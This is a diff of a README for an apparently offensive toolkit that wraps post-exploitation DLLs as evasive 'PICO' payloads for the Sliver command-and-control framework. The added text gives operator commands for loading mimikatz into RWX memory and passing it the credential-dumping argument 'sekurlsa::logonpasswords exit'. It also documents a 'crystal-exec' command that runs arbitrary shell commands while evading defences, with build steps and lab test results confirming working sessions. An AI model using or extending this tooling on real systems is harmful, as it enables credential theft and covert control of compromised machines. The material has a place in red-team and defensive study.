@@ -53,10 +53,26 @@ Once a session is active, run sensitive DLLs (recon, credential dumpers, etc.) t
 
 ```
 sliver > extensions install crystal-loader-0.1.0.tar.gz
-sliver > crystal payload=mimikatz.pico.bin
+sliver > crystal --payload C:/path/mimikatz.pico.bin
 ```
 
-The `crystal-loader.x64.dll` is a Sliver DLL Extension that allocates RWX memory, loads the PICO blob, and jumps to the Crystal Palace entrypoint.
+Pass runtime args without a rebuild by appending them after `|`:
+
+```
+sliver > crystal --payload C:/path/file.pico.bin|args here
+```
+
+The `crystal-loader.x64.dll` is a Sliver DLL Extension that allocates RWX memory, loads the PICO blob, and jumps to the Crystal Palace entrypoint. Paths use forward slashes. Arg format is `type:string` (not BOF binary).
+
+### C — Built-in shell execution via Crystal Palace
+
+`crystal-exec` is a second command bundled in the same extension. It runs arbitrary shell commands through Crystal Palace evasion using a PICO embedded directly in the extension DLL — no PICO file to upload.
+
+```
+sliver > crystal-exec --cmd "whoami /all"
+```
+
+Output is returned to the operator over the existing Sliver session via a pipe. This is the fastest path for one-off shell commands when you do not need a full post-ex DLL.
 
 ---
 
@@ -109,9 +125,13 @@ make -C crystal-kit-sliver/sliver-glue/wrapper smoketest
    crystal-kit-sliver/sliver-glue/build/sliver.crystal.bin \
    crystal-kit-sliver/sliver-glue/build/drop.zip
 
-# 5. Use case B — wrap a post-ex DLL
-./crystal-kit-sliver/sliver-glue/generate.sh /path/to/postex.dll /dev/null \
-   crystal-kit-sliver/sliver-glue/build/postex.pico.bin
+# 5. Use case B — wrap a post-ex DLL (postex.sh handles naming and prints the sliver command)
+./crystal-kit-sliver/sliver-glue/postex.sh /path/to/postex.dll
+# With baked-in args:  postex.sh /path/to/postex.dll "sekurlsa::logonpasswords exit"
+./crystal-kit-sliver/sliver-glue/pack-extension.sh
+
+# 6. crystal-exec — rebuild the built-in command executor (only needed after modifying crystalexec.c)
+cd crystal-kit-sliver/sliver-glue/crystal-exec && make && cd -
 ./crystal-kit-sliver/sliver-glue/pack-extension.sh
 ```
 
@@ -132,6 +152,8 @@ See `docs/RUNBOOK.md` for the full operator procedure (Sliver install, listener 
 | Extension tarball packs correctly | OK | 37 KB tarball validated with `tar -tzf` |
 | Operator drop bundle (PICO + stager) | OK | 182 KB zip with `run.x64.exe` + PICO + README |
 | Runtime execution on Windows (Use case A) | OK | Sliver session established on Windows 10 x64 FLARE-VM via `run.x64.exe sliver-crystal.bin` |
+| Runtime execution on Windows (Use case B) | OK | `crystal --payload C:/path/file.pico.bin` — new Sliver session established via post-ex PICO; arg format verified as `type:string`, forward slash path |
+| `crystal-exec` command | OK | Shell command output returned to operator via pipe; PICO embedded in extension DLL, no upload required |
 
 ---
 
@@ -170,8 +192,10 @@ See [`NOTICE.md`](NOTICE.md) for the full list of upstream copyrights and licens
 - [x] 6a — DLL wrapper written, built (MinGW 15.2), packaged, smoke test shellcode
 - [x] 6b — Crystal Palace CLI verified, real PICO built end-to-end
 - [x] 6c — Dual use case A/B: `generate-implant.sh` + `bundle-implant.sh`
-- [x] 6d — Runtime test on Windows x64 lab — Use case A verified 
-
+- [x] 6d — Runtime test on Windows x64 lab — Use case A verified (Sliver session established on FLARE-VM)
+- [x] 6e — Use case B runtime verified (`crystal --payload` works, arg format fixed to `type:string`, forward slash path)
+- [x] 6f — `crystal-exec` command: built-in post-ex shell execution via Crystal Palace (no upload required)
+- [x] 6g — Runtime args via `|` separator for dynamic DLL args without rebuild
 
 ---
 
